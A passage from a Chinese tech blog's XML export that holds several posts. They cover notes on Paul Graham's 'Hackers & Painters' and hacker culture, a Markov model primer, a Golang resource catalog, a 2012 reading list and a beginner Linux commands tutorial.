Preview SDN 技术指南（八）：案例 互联网企业数据中心：Google SDN 医疗行业 Discuss 云数据中心网络分析及安全技术方案实践(DPDK是一组快速处理数据包的开发平台及接口) | 王凯@云杉网络研发部 走近Google基于SDN的B4网络 | @盛科张卫峰 863项目：未来网络体系结构和创新环境(FINE) | @清华大学-毕军 百度：如何优化多数据中心的带宽成本？ 读者反馈 基于 SDN 实现 VPNAssessment of SDN technology for an easy-to-use VPN service 参考文献 资讯：三星主办 ONOS Build 2017 What is the OpenDaylight Project (ODL)? 对话大神Scott Shenker：从物理博士到SDN’s Uncle | CSDN,2014 新贵与遗老：被集群路由器和POS绑架的运营商网络 | 徐建锋 一张复杂网络的生长过程| jaseywang.me]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:黑客与技术、产业及其精神世界]]></title>
    <url>%2F2017%2F05%2F09%2FCyberSecurity-Hacker%2F</url>
    <content type="text"><![CDATA[理解计算机的关键，则是要理解计算机背后的人。表面上这是一个机器的时代，但是实际上机器的社记者决定了我们的时代。 摘要 读书笔记|《黑客与画家》 《黑客与画家》（Hackers &amp; Painters） 的内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。 黑客（hacker）：解释一，最优秀的程序员；解释二，入侵计算机的人。本书特指第一种人。 原作者：Paul Graham （保罗·格雷厄姆）美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。 翻译者：阮一峰阮一峰也是一位神人，是国内知名的 IT 技术专家。10 余年来发表了海量的网络文章，内容包含读书、经济学、历史、IT技术、医学、电影、音乐和美术、政治学、科学、创业、互联网等等等，我知道的好像他都知道。无论是否从事 IT 职业，阅读他的博客相信都会受益良多。 怎么理解编程语言？ 程序员非常 忠于 他们心爱的语言。编程语言与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。（p178） 在不考虑其他因素的情况下，总的来看，对于应用程序来说，选择总体上最强大、效率也在可接受范围内的编程语言。 如果从 图灵等价（Turing-equivalent） 的角度看来看，所有语言都是一样强大的，但是这对程序员没有意义。关于强大很难正式定义，有一个解释方法是一些功能在一种语言是内置的，但是在另一种语言中需要修改解释器才能做到，那么前者就比后者更强大。 如果A语言有一个运算符可以移除字符串中的空格，而B语言没有这个运算符，这种情况则不足以称A语言比B语言强大，因为你可以在B语言里写一个函数实现这个功能。但是A语言支持某种高级功能（假定是递归），而B语言不支持，你就不可能通过自己编写函数库解决了，这就代表A语言比B语言更强大。 例外情况：1）如果在开发的程序必须与另一个程序紧密配合，那么可能最好还是使用后者的开发语言。2）如果程序只是要做一些很简单的事（比如整数运算或位操作），那就不妨使用一种比较靠近机器的低层次语言，这样运行起来会更快一些。3）如果程序只是为了特定场合一次性使用，那么你最好根据自己需要解决的问题选择具有强大函数库的语言。 论编程方法 应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。(p165 ) 书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。(p22) 评价一种语言的优劣不能简单地看最后的程序是否表达得很漂亮，而要看程序从无到有的那条完成路径是否很漂亮。（p215） 源代码应该可以自己解释自己。 程序写出来是给人看的，附带能在机器上运行。—— 《计算机程序的结构与解释》 不要把编程语言看成那些已完成的程序的表达方式，而应该把它理解成促进程序从无到有的一种媒介。这里的意思是说，成品的材料和开发时用的材料其实是不一样的。搞艺术的人都知道，这两个阶段往往需要不同的媒介。比如，大理石是一种非常良好、耐用的材料，很适合用于最后的成品，但是它极其缺乏弹性和灵活性，所以不适合在构思阶段用来做模型。（p215） 论思想自由Paul Graham 在《黑客与画家》一书中，始终强调思想自由对人才、对技术进步和公众利益的极端重要性。例如： 如果别人告诉你该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。（p35） 流行的思想观点与流行的服饰产生方式不尽相同，但是，它们的传播路径却很相似。第一批的接受者总是带有很强的抱负心，他们有自觉的精英意识，想把自己与普通人区分开来。当流行趋势确立以后，第二批接受者就加入进来了，人数比上一批庞大得多，恐惧心在背后驱使着他们。他们接受流行，不是因为想要与众不同，而是因为害怕与众不同。（p43） 只有保持一定的距离才能观察到人们观念的变化，发现流行（也就是人们自以为是正确的事情）到底是什么。如果你想要清晰地思考，就必须远离人群。（p50） 想要做出优秀作品，你需要一个什么问题都能思考的大脑。 尤其是那些不应该思考的问题，你的大脑也要养成思考它们的习惯。优秀作品往往来自于其他人忽视的想法，而最被忽视的想法就是那些禁止的思想观点。 智力越高的人，越愿意去思考那些惊世骇俗的思想观点。这不仅仅因为聪明人本身很积极地寻找传统观念的漏洞，还因为传统观念对他们的束缚力很小，很容易摆脱。从他们的衣着上就可以看出这一点：不受传统观念束缚的人，往往也不会穿流行的衣服。 做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。（p45） 如果你能“远远地”跳出传统思维，提出让别人一听就脑袋轰一声炸开的惊人观点，那么你就在“小小地”跳出传统思维方面不会有任何困难。要知道，人们把后面的这种情况称为“创新”。(p46) 在思想自由和言论自由的关系上，Paul Graham 大声疾呼：自由思考比畅所欲言更重要！。 如果你感到一定要跟那些人辩个明白，绝不咽下这口气，一定要把话说清楚，结果很可能是从此你再也无法自由理性地思考了。我认为这样做不可取，更好的方法是在思想和言论之间画一条明确的界限。在心理无所不想，但是不一定要说出来。你的思想是一个地下组织，绝不要把那里发生的时期一股脑说给外人听。（p47） “守口如瓶”的真正缺点在于，你从此无法享受讨论带来好处了。讨论一个观点会产生更多的观点，不讨论就什么观点也没有。 找一些信得过的知己，只与他们畅所欲言、无所不谈。这样不仅可以获得新观点，还可以用来选择朋友。能够一起谈论“异端邪说” 并且不会因此气急败坏的人，就是你最应该认识的朋友。 论知识产权关于知识产权制度，从诞生的那一天起实际上就存在支持/反对两大阵营。黑客大多坚定地站在反对派阵营，或者说黑客群体是反对知识产权制度中最重要的一支力量。 首先，对于美国而言，其知识产权制度拥有 200 多年的历史，拥有强大的知识产权保护体系。 国会应有权……促进科学和实用艺术的进步，确保有限时报作者和发明者的独家权利，以及他们各自的著作和发现….. 美国宪法第一章第8款 1789 年《宪法》第一章第 8 款 1790年4月10日，美国第一部版权法。保护范围：图书、地图和图表，之后扩展到摄影、录音和电影。（大清国乾隆五十五年，同年本杰明·富兰克林&amp;亚当·斯密逝世） 1909年版权法案。未经授权的复制的定义必须是从视觉上可以看到或阅读的一种形式（音乐卷片、ROM芯片上下象棋的游戏等都不在保护之列）。 1976年和1980年，版权法修改，使之涵盖了计算机软件。 历史上，机器内部的控制系统一直是物理装置：齿轮、杠杆和连接器等。但是，计算机的出现使得机器的控制系统逐渐变成了软件（包括数据（Data）在内的统称，例如胶片上的歌曲属于用物理方法压制在盘片上的数据）。互联网的出现使得复制品更容易流通，相关产业公司推动政府通过了严厉的法律，保护知识产权，作为对新技术的回应。 黑客反对知识产权制度的观点中，最重要的一条是保护人的“思想自由”。 对于版权和专利这样的制度，黑客深感担忧。他们感到，保护“知识产权”的力度不断增大，已经威胁到了他们完成工作所必需的“思想自由”。（p54） 立法者的愿意可能是好的。但是，他们也许没有意识到，这样的法律弊大于利。(p55) 黑客（Hacker）群体在许多方面都表现出强烈的精英意识和自觉。例如，他们坚定地认为，知识产权制度无益于增加公众福利。不仅破坏思想自由权利，而且有加强极权主义制度的巨大危险。他们坚信，保护人的思想自由，就是保护国家持续发展根本动力，只有获得独步天下的技术优势，才有可能增加公众福利，反之，则是非常危险的。 在我看来，一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。专制国家会变成腐败国家，腐败国家会变成贫穷国家，贫穷国家会变成弱小国家。…. 极权主义制度只要形成了，就很难废除。黑客对于公民自由是非常敏感的，因为这对他们至关重要。他们远远地就能感到极权主义的威胁，好比动物能够感知即将来临的暴风雨。（p57） 黑客伦理（hacker ethic）黑客伦理（hacker ethic）是黑客文化中普遍存在的道德价值观和哲学观。起源于上世纪50~60年年代的麻省理工学院（MIT），一个比较流行的版本是由记者 Steven Levy在 1984 年出版的《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）一书种提出。 (1)使用计算机以及所有有助于了解这个世界本质的事物都不应该收到任何限制。任何事情都应该亲手尝试。( Access to computers — and anything that might teach you something about the way to the world works — should be unlimited and total. Always yield to the Hands-On Imperative! ) (2)所有信息应该都是自由的。(All information should be free.) (3)不信任权威，提倡去中心化。(Mistrust Authority — Promote Decentralization.) (4)判断一名黑客的水平应该看他的技术能力，而不是他的学历、年龄或地位等其他标准。(Hackers should be judged by their hacking, not bogus criteria such as degrees, age, race, or position. ) (5)你可以用计算机创造美和艺术。(You can create art and beauty on a computer.) (6)计算机使生活更美好。(Computers can change your life for the better.) “黑客伦理”的一个必然推论就是，黑客不服从管教，具有叛逆精神。黑客通常对管理者强加的，限制他们行为的愚蠢规定不屑一顾，会找出规避的方法。 Paul Graham：The people who break rules that are the source of America’s wealth and power.只有那些不服从管教的人们，才是美国财富与力量的源泉。 论设计者的品味 黑客新想法的最佳来源，并非那些名字里有“计算机”三个字的理论领域，而是来自于其他创作领域。与其到“计算机理论”领域寻找创意，你还不如在绘画中寻找创意。（p21） 关于软件“版本” 软件是连续性渐变的，某些更新也许比较重大，但是“版本”概念不适用于互联网软件。（我们）什么时候 需要媒体宣传了，就开出一张单子，上面总结了自从上次“发布”以来，我们新增的所有功能，然后在上面填一个新的版本号，发出一个新闻稿，宣布新版本已经准备就绪了。真是神奇啊，从来没有人看穿我们的把戏。 用户需要的设计 用户要求的设计 “顾客永远是对的”，这是指评价优秀设计的标准看它能够多大程度上满足用户的需求。让用户满意并不等于迎合用户的一切要求。用户不了解所有可能的选择，也经常弄错自己真正想要的东西。做一个好的设计师就像做一个好医生一样。你不能头痛医头，脚痛医脚。病人告诉你症状，你必须找出他生病的真正原因，然后针对病因进行治疗。（p214） 将一个构思束之高阁，不仅意味着延迟它的实现，还意味着延迟所有在实现过程中激发的构思。 如果你正在设计某种新东西，就应该尽快拿出原型，听取用户的意见。 今天刚好读到另一篇文章，提出了很多具体的操作方案，可以作为一段注脚吧。作者在邱俊涛 《团队里的两类程序员》 一文中提出，程序员大致可以分为两大类，即： 原型类程序员（prototyper） 产品类程序员（engineer） 原型类程序员适用于项目得早期阶段，或者说 Idea 尚不明确的阶段，设计者基于一个易于修改的媒体介质（比如 HTML+CSS 页面，而不是 Photoshop 原图或“重型”代码），然后向客户及所有项目相关人来确认，然后根据反馈来快速调整。通过快速且轻量级的迭代原型设计，最大可能压缩反馈周期，避免返工。 产品类程序员则更适用于高度产品化的项目，对程序员的要求就会有不同，尤其需要具备严谨的工程实践经验，例如：安全意识、性能意识、容灾、高可用、自动化测试、软件架构、甚至代码管理、部署流程等方方面面，要求的是全生命周期的规范化，尤其注重软件内部质量（邱俊涛用的定语是“深刻而周全”）。 关于快速反馈的观点，个人觉得还有几点不成熟的想法，略作补充： 原型必须 高度仿真，否则未必能收到好的效果，没有人可以在一个失真的想象中做出正确的决策。例如，如果项目背景追求美观和视觉效果，就得要求原型和最终上线版本有完全一样的样式输出；如果是业务逻辑复杂得人机交互，原型就必须包含所有原子操作和全套模拟数据； 包括设计师/BA 等人在内，都要求掌握快速原型方法、轻量级编程能力、具备多样化技术能力（前后端），真正的 Hacker 几乎都是通才； 轻量级的迭代过程同样需要精细化，例如构建通用的模块化原型资源，大量利用 CDN ，全程使用版本管理工具等； 不管采用哪一类程序员，都不存在“物美价廉”这种情况，至少不应成为首先考虑的因素，他们的投入产出比都有公允的市场价格体现。 扩展阅读 IT科技史漫谈：Linus Torvalds 与 Linux 操作系统 中文翻译| Linus Torvalds: The mind behind Linux TED现场版| The mind behind Linux 《枪，帆船，帝国：技术革新在1400-1700年欧洲扩张早期阶段的作用》 （Guns, Sails, and Empires: Technological Innovation and the Early Phases of European Expansion 1400-1700） Carlo Cipolla 著，Pantheon，1965 年出版。 《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）| Steven Levy，1984 《刺杀戴高乐》弗雷德里克·福赛思 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处网络安全与科技罪案调查科 参考文献 阮一峰 |《黑客与画家：硅谷创业之父Paul Graham文集》 邱俊涛 | 团队里的两类程序员]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络]]></title>
    <url>%2F2017%2F05%2F09%2FMathmetics-Markov-Model%2F</url>
    <content type="text"><![CDATA[摘要 马尔可夫模型（Markov Model ） 隐含马尔可夫模型（ Hidden Markov Model ） 隐含隐马尔可夫模型的应用 马尔可夫链的扩展 —— 贝叶斯网络（Bayesian Network） 19 世纪到 20 世纪初，马尔可夫（Andrey Markov）提出假设，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下： P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1) 马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。 123456789digraph markov&#123; label = " Markov 马尔可夫链"; rankdir = LR; m1-&gt;m2[label = "1.0"]; m2-&gt;m3[label = "0.6"]; m3-&gt;m4[label = "0.3"]; m2-&gt;m4[label = "0.4"]; m3-&gt;m3[label = "0.7"];&#125; 隐含马尔可夫模型（ Hidden Markov Model ）最早由20世纪六七十年代，美国数学家鲍姆（ Leonard E. Baum ） 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。 隐马尔可夫模型的应用隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。 1、应用领域：翻译 语音识别，声学模型（ Acoustic Model ） 机器翻译，翻译模型（ Translation Model ） 中文断词/分词或光学字符识别 拼写纠错，纠错模型（ Correction Model） 手写体识别 2、应用领域：图像识别3、生物信息学 和 基因组学 基因组序列中蛋白质编码区域的预测 对于相互关联的DNA或蛋白质族的建模 从基本结构中预测第二结构元素 通信中的译码过程 隐含马尔可夫模型的训练 知识背景：概率论 围绕隐含马尔可夫模型的基本问题 给定一个模型，如何计算某个特定输出序列的概率；Forward-Backward 算法参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》 给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列解码算法：维特比算法 给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm） 扩展阅读 读书笔记|数学之美（Beauty Of Mathmetics） 参考文献 马尔科夫模型与离散事件系统仿真模型简析 | 则裕沙龙@立波 从贝叶斯方法谈到贝叶斯网络 | v_JULY_v (结构之法 算法之道) 斯坦福大学公开课-机器学习过程-马尔可夫决策过程 从贝叶斯定理到概率分布：综述概率论基本定义 | 算法与数学之美 实例详解贝叶斯推理的原理 | 2017-10-03 算法与数学之美]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog：玩转编程语言 - Golang 专题]]></title>
    <url>%2F2017%2F05%2F05%2FLanguage-Go-lang%2F</url>
    <content type="text"><![CDATA[摘要 ABC 基于 Golang 的应用 Golang 最佳实践 围棋十诀 一、不得贪胜。二、入界宜缓。三、攻彼顾我。四、弃子争先。五、舍小就大。六、逢危须弃。七、慎勿轻速。八、动须相应。九、彼强自保。十、势孤取和。————（唐）王积薪 一、ABC Go by Example Popular sites, blogs and tutorials for learning and mastering Go Language Learn Go with tests 1.1 Install https://go.googlesource.com/go/ 123456789101112131415tar -C /usr/local/go-$version -xvf go-$version.tar.gzcd /usr/local/go-$version/src./all_bash#compile,build and testunset GOROOTunset GOPATHunset GOAPPATHexport GOROOT=/usr/local/goexport GOPATH=$GOROOT/binexport GOAPPATH=$GOROOT/bin/binexport PATH=$PATH:$GOPATH:$GOAPPATH 1.2 Go Version Manage1234//atom 代码提示go get -u github.com/jstemmer/gotags//源代码目录执行gotags -tag-relative=true -R=true -sort=true -f="tags" -fields=+l . build 1234567891011121314## 交叉编译build-linux: export CGO_ENABLED=0 &amp;&amp; export GOOS=linux &amp;&amp; export GOARCH=amd64 &amp;&amp; go buildbuild-wins: export CGO_ENABLED=0 &amp;&amp; export GOOS=windows &amp;&amp; export GOARCH=amd64 &amp;&amp; go buildbuild-solaris: export CGO_ENABLED=0 &amp;&amp; export GOOS=solaris &amp;&amp; export GOARCH=amd64 &amp;&amp; go build## Go supports Solaris 11 on amd64, but not sparc.To build for sparc you need to use gccgo.## 压缩go build -ldflags &apos;-w -s&apos; 1.3 Tips 一些 package时候的会由于众所周知的原因而无法下载 123unrecognized import path "golang.org/x/sys/unix"cd $GOPATH/src/golang.org/x/git clone --depth=1 https://github.com/golang/xxx.git error handling in Go: more expressive syntax (Slides) High Performance Go | Infoq.com 二、基于 Golang 的应用2.1 基于Go语言构建RESTful JSON API2.2 基于Kafka构建事件溯源模式的微服务讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 2.3 开源技术架构漫谈：应用程序开发中的日志管理2.4 网络数据包的捕获、过滤和分析(Packet Capturing) What is Packet Capturing How can it be used What is libpcap What is tcpdump &amp; winpcap &amp; snoop What is BPF What is gopacket 2.5 数据可视化（五）基于网络爬虫制作可视化图表 基于网络爬虫的可视化图表:golang,goquery 案例：最近十年全国彩票销售变化情况 案例：中国科学院院士分布 数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts） 三、Golang 最佳实践3.1 Grammar Tips &amp; Simple Demo Port Forwarding with Go (zupzup.org) A guide to understanding HTTP Request handling and processing in Go Understand Go pointers in less than 800 words there-is-no-pass-by-reference-in-go 让go get显示进度 exec.Command()实时输出 Building a Worker Pool in Golang | Dynamically scalable queue consumer How did I improve latency by 700% using sync.Pool The interface is a tool so that you can wire dependencies just by their behaviour, not by how they implement that behaviour. Golang Interfaces 用 Go Plugin 构建模块化系统 3.2 Specialist: Architecture Using Einstein Vision Within Golang （Waiting）By Rajdeep Dua | Published: May 5, 2017Einstein Vision is a service that helps you build smarter applications by using deep learning to automatically recognize images. It provides an API that lets you use image recognition to build AI-enabled apps. Trying Clean Architecture on Golang: Independent, Testable , and CleanBy Iman TumorangFollow | Passionate and Curious Learner in Software Engineering 【翻译】生活在没有泛型的Go语言世界里 | Cholerae 5 Reasons Why We switched from Python To Go 3.3 Go Repository Walk through JSON with Go Using job queues in Go for resilient systems mux router | Go Router Repository httprouter | Go Router Repository Go packages in R packages NanoDano:Making Tor HTTP Requests with Go | Socket Proxy vlan-nats riot：Go Open Source, Distributed, Simple and efficient Search Engine K6: A modern load testing tool, using Go and JavaScript internationalization-i18n-go goproxygolang实现的高性能http,https,websocket,tcp,udp,socks5代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转，TLS加密传输，协议转换 Advanced Forwarding with Go github.com/elazarl/goproxy Encrypted reverse proxy in Go. TavenLi/port-forward 爬虫(简易型) ：https://github.com/lealife/leacrawler 3.3 Business Product List InfluxDB:时间序列数据库，实时数据场景 Marketstore | The Financial Time Series Database File Manager | Web Browser Books《Introducing Go: Build Reliable, Scalable Programs》 特点：精简 预览链接 Others 《The Little Go Book》 《The Go Programming Language》 特点：基础全面 预览链接 《Go Web Programming》 特点：Web Application 预览链接 Concurrency in Go: Tools and Techniques for Developers 特点：Concurrency 预览链接 《Go Programming Blueprints》 特点：covers a lot of topics，such as web services,command-line tools,microservices and app deployment. 预览链接 Others Karl Seguin book: https://github.com/thewhitetulip/web-dev-golang-anti-textbook/youtube series: https://www.youtube.com/playlist?list=PL41psiCma00wgiTKkAZwJiwtLTdcyEyc4code: http://github.com/thewhitetulip/Tasks 扩展阅读 玩转编程语言系列 参考文献 ipfans:使用vendor管理Golang项目依赖 (推荐)InfoQ:goroutine背后的系统知识 Qu Xiao:Goroutine + Channel 实践 GitBook:《深入解析Go》]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如果快速构建一个知识体系：以中情局的 WorldBook 为例]]></title>
    <url>%2F2017%2F05%2F03%2FTeamWork-WorldBook%2F</url>
    <content type="text"><![CDATA[摘要待编辑 参考文献 CIA：The World Facbook]]></content>
      <tags>
        <tag>最佳工程实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Autobiography:我的2012年度盘点]]></title>
    <url>%2F2017%2F04%2F28%2FCheck2012%2F</url>
    <content type="text"><![CDATA[我的2012年阅读书单 不忘初心 最近有读者在微信公众号后台留言，希望我能推荐些对自己影响较大的书籍（不限于人生思想、专业技术等方面）。说实话这个问题还真是很难回答，毕竟我自己都还没活明白呢！焦虑满满、困惑比所知多得多，更何况各人背景不同，前路不同，我所知所能也未必就比别人高明，草率推荐就有好为人师、误人子弟的嫌疑了。 恰好在整理过去的文档资料的时候，发现一份2012年读书笔记，记录了那些年读过的一些东西。以现在的眼光来看，当时的探索最大的意义在于重新构建了历史观。特别是超脱天朝教育体制第一次从世界史的角度认识世界。 大家感兴趣的还是国内史，尤其是古代史中帝王将相的权谋。几年前在一个图书公司的招待会上，我亲耳听到一位作者断言：“历史写作的核心是权谋！”其实真说起来，很多热衷写历史权谋的人，自己不在权力系统里，一生少有操弄权术的机会，多是村夫野老三两杯薄酒后指点江山的悠谬之谈。远如《三国演义》里诸葛亮派将领打仗前要给几个妙计锦囊，近如《甄嬛传》在路上放个鹅卵石让敌人流产，都属于二手权谋家关起门来的臆想，谁信谁倒霉。——–《读史很容易变成谄媚式的揣摩，或者遗老式的缅怀》 总的来说这些阅读的主题非常凌乱，内容良莠不齐，个人的阅读体验也深浅不一，大部分只做到通读而已。人是非常复杂的，很难说会因为读几本书就有根本改变。我们所能做的，无非保持持续阅读、保持持续探索之心，在探索中不断修正航向。 一、历史和社会科学中国史 通读《史记》￼ 秦史: 小说/电影《大秦帝国》、纪录片《复活的军团》 通读《汉书》 ￼ 通读《资治通鉴》 ￼ 魏晋南北朝：李鸿宾、阎步克系列讲座 明史：《明朝那些事儿》（全套） 明史：《血酬定律》 明史：《明季北略》（未深入） 《透过钱眼看中国历史》 宗教专题世界各主要宗教发展简史 世界史 世界通史 英国通史 《Mr Bean》、《英伦见闻录》 德国通史￼ 法国通史 ￼ 俄国通史 ￼ [美]沃尔特-G-莫斯《俄国史》 美国通史 比尔德《美国文明的兴起》 罗荣渠《美国历史通论》 日本通史 《东亚三国志》 北欧通史 荷兰通史 《Golden Age–Bontekoe in Asia》（17世纪班德固船长航海日志） 《大国海盗》 《东亚海域一千年》 语言：法语 （进展甚微） 公民伦理 《美国独立宣言The Declaration of Independence》 托克维尔：《旧制度与大革命》、 《论美国的民主》￼（上卷） 卢梭：《忏悔录》（les confessions）￼第三章 富兰克林：《富兰克林自传》￼ 庞勒《大众心理研究》 野记杂文 《阅微草堂笔记》 《容斋笔记》 《中国巫术史》 《丑陋的中国人》￼ 《摩托日记》 《格萨尔王》 《藏地密码》 《房龙地理》 《林则徐西域记》（未深入） 《海国图志》（缺） 二、艺术鉴赏 《欧洲文化起源研究》 马赛曲 扬基都德 舞台剧￼《南海十三郎》 粤剧《昭君出塞》 粤剧《子建会洛神》 粤语相声：黄俊英 篆刻《中国印史》 三、工程技术&amp;科学 无线电￼ 进展甚微 孙思邈 《千金方》（序） 《中国人的身体和疾病–医学修辞和叙事》 [美]迈克尔-赫-斯通《剖析恶魔》(精神病学分析) 《躁狂抑郁多俊才》 《精子战争》 《微生物与人类》 四、商业 《史记-货殖列传》 《汉书-食货志》 吴晓波《大败局》 莫妮卡-兰利《花旗帝国》 《簿记论》 《哥德堡号中国之旅》 邓九刚《茶叶之路》(中俄) Ben Simpfendorfef《新丝绸之路》、 《香料传奇Spice:The History of a Temptation》 《集装箱改变世界》 《移民法：出入境权研究》 《粤海关志》(未深入) 《近代中国的走私与海关》 2017-04-27 整理更新 分类:我的自传source:https://riboseyim.github.io/2017/04/28/Check2012/]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统原理：Linux Commands]]></title>
    <url>%2F2017%2F04%2F26%2FLinux-Commands%2F</url>
    <content type="text"><![CDATA[摘要 Linux Commands | Linux 常用命令 Learn By Example 查看硬件信息1234567891011$ lscpu$ cat /proc/cpuinfo$ cat /proc/cpuinfo | grep 'processor' | wc -l # 逻辑CPU个数$ cat /proc/cpuinfo | grep 'physical id' | sort | uniq | wc -l # 物理CPU个数$ cat /proc/cpuinfo | grep 'cpu cores' | wc -l # 每个物理CPU中Core的个数$ cat /proc/meminfo$ fdisk -l$ ifconfig -a$ lspci$ dmidecode -t bios$ dmidecode -q Learn By Example Command-line-text-processing 1234567891011121314151617181920212223242526$ echo 'foo:123:bar:789' | awk -F: '&#123;print $2,$3&#125;'123 bar$ # second field where input field separator is :$ echo 'foo:123:bar:789' | awk -F: '&#123;print $2&#125;'123$ # last field$ echo 'foo:123:bar:789' | awk -F: '&#123;print $NF&#125;'789$ # first and last field$ # note the use of , and space between output fields$ echo 'foo:123:bar:789' | awk -F: '&#123;print $1, $NF&#125;'foo 789$ # second last field$ echo 'foo:123:bar:789' | awk -F: '&#123;print $(NF-1)&#125;'bar$ # use quotes to avoid clashes with shell special characters$ echo 'one;two;three;four' | awk -F';' '&#123;print $3&#125;'three$ echo 'Sample123string54with908numbers' | awk -F'[0-9]+' '&#123;print $2&#125;'string more details:Shell startup scripts AWK in 20 minutes Ten Things I Wish I’d Known About bash Linux Commands原文：https://www.howtoforge.com/linux-commands/ 本文的特点是非常简洁，将繁杂的Linux命令行筛选出100条左右，非常适合入门学习。此外，将领域知识以“条目+示例”的方式来整理，类似编字典一样，在编辑的过程中可以促进学习者加深认识，也方便日后持续改进（增加注解、参考文献、索引等），是一种不错的学习方法。最后，整理这些命令行的时候，我体会到操作系统最重要的工作实际就是对文件的管理，创建、移动、查看、编辑、销毁、检索，都是围绕文件的操作，事实上也是实际工作中使用最频繁的需求。对开发者来说，以Linux命令行为模版，命名风格、人机交互、小而美的实现方式，促进自己在其它领域的应用、提高大有裨益。 Adduser/Addgroup分类：权限管理；增加用户、用户组 The adduser and addgroup commands lets you add a new user and group to a system, respectively. Here’s an example for adduser:1234567$ sudo adduser testuserAdding user `testuser&apos; ...Adding new group `testuser&apos; (1003) ...Adding new user `testuser&apos; (1003) with group `testuser&apos; ...Creating home directory `/home/testuser&apos; ...Copying files from `/etc/skel&apos; ...Enter new UNIX password: Arch分类：系统信息；查看CPU架构 The arch command is used to print the machine’s architecture. For example:123$ archi686Not sure what &apos;i686&apos; means? Head here. Cal/Ncal分类：系统信息；查看日历 The cal and ncal commands display a calendar in the output.123456789101112131415161718$ calMarch 2017Su Mo Tu We Th Fr Sa1 2 3 45 6 7 8 9 10 1112 13 14 15 16 17 1819 20 21 22 23 24 2526 27 28 29 30 31$ ncalMarch 2017Su 5 12 19 26Mo 6 13 20 27Tu 7 14 21 28We 1 8 15 22 29Th 2 9 16 23 30Fr 3 10 17 24 31Sa 4 11 18 25 Cat分类：文件管理；查看文件内容The cat command allows you to concatenate files, or data provided on standard input, and print it on the standard output. In layman terms, the command prints the information provided to it, whether through stdin or in the form a file.12$ cat test.txtHello...how are you? Cd分类：文件管理；切换工作目录The cd command is used to change user’s present working directory.1$ cd /home/himanshu/ Chgrp分类：文件管理、权限管理；切换文件所属组The chgrp command allows you to change the group ownership of a file. The command expects new group name as its first argument and the name of file (whose group is being changed) as second argument.1$ chgrp howtoforge test.txt Chmod分类：文件管理、权限管理；切换文件执行权限The chmod command lets you change access permissions for a file. For example, if you have a binary file (say helloWorld), and you want to make it executable, you can run the following command:1chmod +x helloWorld Chown分类：文件管理、权限管理；切换文件所有者The chown command allows you to change the ownership and group of a file. For example, to change 